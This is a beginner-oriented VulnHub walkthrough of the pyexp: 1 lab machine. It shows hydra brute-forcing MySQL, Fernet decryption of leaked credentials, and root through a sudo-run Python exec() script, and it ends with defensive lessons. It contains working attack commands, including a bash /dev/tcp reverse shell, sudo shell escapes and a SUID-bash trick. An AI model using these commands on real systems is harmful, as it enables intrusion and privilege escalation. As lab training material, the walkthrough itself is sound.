# pyexp: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational walkthrough for students on an **isolated lab network**. Only attack
> machines you own or have explicit permission to test. Screenshots are
> placeholders — capture your own.

| Field | Value |
| --- | --- |
| **Machine** | pyexp: 1 |
| **Difficulty** | **3 — Easy** (stated: *Easy*) |
| **Author** | 0xatom |
| **Released** | 11 August 2020 |
| **VulnHub Entry** | https://vulnhub.com/entry/pyexp-1,534/ |
| **Download** | https://vulnhub.com/entry/pyexp-1,534/#download |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Debian 10 "buster") |

> **Note:** passwords, the Fernet key/ciphertext, and flag values **vary by
> build**. The values shown are from commonly shared builds of the downloadable
> VM.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to find a target and enumerate **non-web** services (SSH on a custom port,
  MySQL).
- How to brute-force a service password with `hydra` when there is no web app.
- How to enumerate a MySQL database and recognise an encrypted secret.
- What **Fernet** encryption is and how a leaked key + ciphertext = plaintext.
- Why `exec()` on unsanitised user input is dangerous.
- How a `sudo` rule that runs a Python script as root becomes instant root.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated host-only network.

```bash
# Identify your own IP and subnet. "eth0" is the lab NIC (name may differ).
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** Kali holds a `192.168.56.x` address (VirtualBox host-only)
> or `192.168.19x.x` (VMware). The target lives on the **same** subnet.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)
> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
# ARP-scan the subnet to list live hosts.
sudo arp-scan --interface=eth0 --localnet
# or: sudo nmap -sn 192.168.56.0/24
```

```text
192.168.56.101   08:00:27:aa:bb:cc    PCS Systemtechnik GmbH
```

**Target IP:** `192.168.56.101`

> **Tip:** pyexp sometimes prints its DHCP address on the VM login screen, so you
> can confirm the IP there too.

![Finding the target host](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — open ports and services

```bash
# Full TCP sweep first, then deep service detection on the open ports.
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 1337,3306 -oA scans/services 192.168.56.101
```

```text
PORT     STATE SERVICE VERSION
1337/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
3306/tcp open  mysql   MySQL 5.5.5-10.3.x-MariaDB (Debian)
```

> **How to read it:**
> - There is **no port 80** here — this box is about services, not a website.
> - Port **1337** is SSH moved off the default port 22.
> - Port **3306** is MySQL/MariaDB. Databases are a prime target: misconfigured
>   ones may have weak passwords or expose data.


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
# Quick connect test to confirm the SSH banner.
nc 192.168.56.101 1337
```

```text
SSH-2.0-OpenSSH_7.9p1 Debian-10
```

> **Why it matters:** With only SSH and MySQL exposed, the usual "web exploit"
> path is gone. Our attack surface is now: (a) password-guess MySQL, or
> (b) find credentials somewhere and log in over SSH.

![Port and service scan](images/02-nmap.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Brute-force the MySQL root password

With no web app to exploit, we try weak/default credentials against MySQL. `root`
is the most likely account.


> ### 📖 Concept — What is Hydra doing?
>
> **Hydra** is a network login brute-forcer. It speaks the login protocol of ~50
> services (SSH, FTP, HTTP, MySQL, SMB, RDP, VNC, SNMP…) and tries credential
> combinations until one is accepted. There is no exploit and no cleverness — it is a
> very fast, very patient guesser.
>
> | Flag | Meaning |
> | --- | --- |
> | `-l USER` / `-L file` | single **l**ogin name / a *file* of them |
> | `-p PASS` / `-P file` | single **p**assword / a *file* of them |
> | `-C file` | a file of colon-separated `user:pass` **pairs** (credential stuffing) |
> | **`-e nsr`** | also try **n**ull password, **s**ame-as-username, and **r**eversed username |
> | `-f` | stop at the first success |
> | `-t N` | threads — higher is faster, noisier, and can destabilise a lab VM |
> | `-I` | ignore a stale `hydra.restore` file |
> | `ssh://` | the **service module** — picking the wrong one is the most common Hydra mistake |
>
> **`-e nsr` should be on every run.** The three cheapest guesses in existence are
> empty, the username, and the reversed username — and they succeed astonishingly
> often, usually in under a second, before the wordlist is even consulted.
>
> **A wordlist attack is not a brute force.** Different attacks, different costs:
>
> | Attack | Tries | Notes |
> | --- | --- | --- |
> | **Wordlist** | curated list, many passwords → **one** account | Fast, high hit rate |
> | **Brute force** | every character combination | Astronomically slow |
> | **Password spraying** | **one** password → **many** accounts | Stays under per-account lockout thresholds |
> | **Credential stuffing** | real leaked `user:pass` pairs | Exploits reuse |
>
> > ⚠️ Pointing Hydra at all 14 million lines of `rockyou.txt` over SSH would take
> > days and generate millions of failed logins in `auth.log`. Fine on a VM you own;
> > on a real system it is an obvious, logged event. Professionals throttle with
> > `-t 4`, use a short targeted list, and spray rather than hammer.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§7.4 — Recognising the shape of the tool call](../../docs/CONCEPTS.md#74-recognising-the-shape-of-the-tool-call)
> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
# -l = single username, -P = password list, mysql:// = protocol schema.
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.56.101 mysql
```

```text
[3306][mysql] host: 192.168.56.101   login: root   password: prettywoman
1 of 1 target successfully completed, 1 valid password found
```

> **Why it works:** MySQL allows clients to connect remotely (if bound to
> `0.0.0.0`) and this build has a weak root password that appears in `rockyou.txt`.
> `rockyou.txt` is a huge list of real-world leaked passwords — always try it
> against exposed auth services in a lab.

> **Note:** the exact password **varies by build**. If `root` fails, try `admin`
> as the username too.

![Hydra brute-forcing MySQL](images/03-bruteforce.png)

### 3.2 Enumerate the database and find an encrypted secret

```bash
mysql -u root -h 192.168.56.101 -p
# password: prettywoman
```

```sql
SHOW DATABASES;
```

```text
+--------------------+
| Database           |
+--------------------+
| data               |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

```sql
USE data;
SHOW TABLES;
SELECT * FROM fernet;
```

```text
+--------------------------------------------------------------------+---------------------------------------------+
| cred                                                               | key                                         |
+--------------------------------------------------------------------+---------------------------------------------+
| gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO...   | UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0= |
+--------------------------------------------------------------------+---------------------------------------------+
```

> **How to read it:** a table literally named **`fernet`** plus a `key` column is
> a giant hint. **Fernet** is a symmetric encryption recipe from the Python
> `cryptography` library. If we have both the **key** and the **ciphertext** (the
> `gAAAAA...` value, base64 of the Fernet token), we can decrypt it offline.

### 3.3 Decrypt the Fernet secret

```bash
# Install the crypto library if needed.
pip3 install cryptography
```

```python
# fernet-decode.py
from cryptography.fernet import Fernet

key  = "UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0="
cred = "gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys="

f = Fernet(key.encode())          # the key must be bytes
print(f.decrypt(cred.encode()).decode())
```

```bash
python3 fernet-decode.py
```

```text
lucy:wJ9`"Lemdv9[FEw-
```

> **Why it works:** Fernet uses a symmetric key to encrypt **and** decrypt. The
> database stored both the key and the ciphertext side by side — so the
> "encryption" provides no protection at all once the DB is readable. The output
> looks like `username:password`.

> **Note:** the decrypted credentials **vary by build**; the `lucy` username is
> consistent, but the password is not. Copy the exact string between the quotes.

### 3.4 SSH in as `lucy`

Remember: SSH is on port **1337**, not 22. Use `-p 1337`.

```bash
ssh -p 1337 lucy@192.168.56.101
# password: wJ9`"Lemdv9[FEw-
```

```text
lucy@pyexp:~$ id
uid=1000(lucy) gid=1000(lucy) groups=1000(lucy)
```

### 3.5 The user flag

```bash
ls -la ~
cat ~/user.txt
```

```text
<user flag — varies by build>
```

![SSH shell as lucy and the user flag](images/05-shell.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — becoming root

### 4.1 Enumerate sudo rights

One of the first things to check on a foothold is what the user can run as root.


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
sudo -l
```

```text
User lucy may run the following commands on pyexp:
    (root) NOPASSWD: /usr/bin/python2 /opt/exp.py
```

> **How to read it:** `lucy` can run **`/usr/bin/python2 /opt/exp.py` as root
> without a password**. That is almost certainly our path to root.

### 4.2 Read the escalated script

```bash
cat /opt/exp.py
ls -l /opt/exp.py
```

```python
uinput = raw_input('how are you?')
exec(uinput)
```

```text
-rw-r--r-- 1 root root 45 ... /opt/exp.py
```

> **Why it works:** the script only has read permissions for us (we cannot edit
> it), but that doesn't matter. It takes **raw input** from the user and feeds it
> straight into **`exec()`**, which evaluates the string as Python code. Since the
> whole thing runs as **root**, whatever Python we type executes as root.

### 4.3 Exploit `exec()` to spawn a root shell

```bash
sudo -u root /usr/bin/python2 /opt/exp.py
```

```text
how are you?
```

At the prompt, type Python that runs a command as the current (root) user:

```python
import os; os.system("/bin/sh")
```

```text
# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
# Alternative one-liners at the "how are you?" prompt:
# read the flag directly:
python
print(__import__('os').popen('cat /root/root.txt').read())
# or make bash SUID, then run it:
import os; os.system("chmod u+s /bin/bash")
# then, back in the target shell:  /bin/bash -p
```

> **Why it works:** we are not "escaping" Python — we are *using* it. Because
> `exp.py` is executed as root, any command we ask `os.system()` / `os.popen()` to
> run is a root command. `import os; os.system("/bin/sh")` simply opens a shell
> that is already root.

![Privilege escalation via sudo python2 /opt/exp.py](images/07-privesc.png)

### 4.4 The root flag

```bash
cat /root/root.txt
# (some builds also have /root/proof.txt)
```

```text
<root flag — varies by build>
```

![Root flag captured](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Remote MySQL with weak root password | MySQL on `:3306` | Unauthenticated access to the whole database |
| 2 | Sensitive secrets stored reversibly in DB | `data.fernet` (key + ciphertext) | Credentials recovered → SSH login as `lucy` |
| 3 | Weak password scheme reused | leaked `lucy` credentials | Account takeover of the OS user |
| 4 | `exec()` on unsanitised user input run as root | `sudo (root) /usr/bin/python2 /opt/exp.py` | Arbitrary code execution as root → full root |

---

## 6. Defensive lessons (blue team)

- **Do not expose MySQL to untrusted networks.** Bind to `127.0.0.1`, restrict
  with firewall rules/security groups, and require per-app least-privilege users.
- **Strong, unique passwords** for every service account; no dictionary words.
  Rate-limit or block repeated auth failures (fail2ban) to defeat `hydra`.
- **Never store a decryption key next to the data it protects.** Encryption is
  pointless if the key is readable with the ciphertext. Use a secrets manager/KMS
  and keep keys out of the database entirely.
- **Do not reuse passwords across systems**, and never overlap web/DB/OS accounts.
- **Avoid `eval`/`exec` on user input** in any language. If you must accept input,
  validate it strictly and never execute it.
- **Least-privilege sudo:** a Python script that runs arbitrary input as root is
  effectively "full root". Never grant `NOPASSWD` sudo to an interpreter or a
  script that evaluates user input.
- **Detection opportunities:** alert on outbound SSH connections from DB hosts,
  on unusual `sudo` command lines (`sudo -u root /usr/bin/python2 /opt/exp.py`),
  and on MySQL connections from unexpected source IPs. Enable auditd and forward
  `auth.log` to a SIEM.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry (download + author notes): https://vulnhub.com/entry/pyexp-1,534/
- Infosec Institute — pyexp: 1 CTF walkthrough: https://www.infosecinstitute.com/resources/capture-the-flag/pyexp-1-vulnhub-ctf-walkthrough/
- Rydzak.me — Proving Grounds: pyexp walkthrough: https://rydzak.me/2022/08/proving-grounds-pyexp-walkthrough/
- Python `cryptography` — Fernet docs: https://cryptography.io/en/latest/fernet/
- GTFOBins — Python: https://gtfobins.github.io/gtfobins/python/
- Hydra documentation: https://github.com/vanhauser-thc/thc-hydra

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — target host discovered on the subnet
- [ ] `images/02-nmap.png` — port/service scan (1337 SSH, 3306 MySQL)
- [ ] `images/03-bruteforce.png` — hydra cracking the MySQL root password
- [ ] `images/04-db-enum.png` — `data.fernet` table with key + ciphertext
- [ ] `images/04b-fernet.png` — decrypted `lucy:...` credentials
- [ ] `images/05-shell.png` — SSH as `lucy` and the user flag
- [ ] `images/07-privesc.png` — `sudo -l`, `exp.py`, and the root shell
- [ ] `images/08-root-flag.png` — root flag

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
